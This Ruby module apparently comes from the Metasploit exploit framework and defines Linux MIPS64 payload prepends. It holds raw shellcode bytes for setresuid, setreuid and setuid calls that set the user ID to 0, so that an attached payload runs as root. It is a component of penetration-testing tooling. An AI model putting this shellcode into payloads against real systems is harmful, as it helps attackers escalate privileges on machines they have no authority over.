#
# Linux mips64 prepends
#
module Msf::Payload::Linux::Mips64::Prepends
  include Msf::Payload::Linux::Prepends

  def prepends_order
    %w[PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    {
      # setresuid(0, 0, 0)
      'PrependSetresuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x28\x05\xff\xff" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\x28\x06\xff\xff" + #    slti  a2, zero, -1  (a2 = 0)     #
        "\x24\x02\x13\xfb" + #    li    v0, 5115      (__NR_setresuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #

      # setreuid(0, 0)
      'PrependSetreuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x28\x05\xff\xff" + #    slti  a1, zero, -1  (a1 = 0)     #
        "\x24\x02\x13\xf7" + #    li    v0, 5111      (__NR_setreuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #

      # setuid(0)
      'PrependSetuid' => "\x28\x04\xff\xff" + #    slti  a0, zero, -1  (a0 = 0)     #
        "\x24\x02\x13\xef" + #    li    v0, 5103      (__NR_setuid) #
        "\x01\x01\x01\x0c", #    syscall 0x40404                  #
    }
  end

  def appends_map
    {}
  end
end
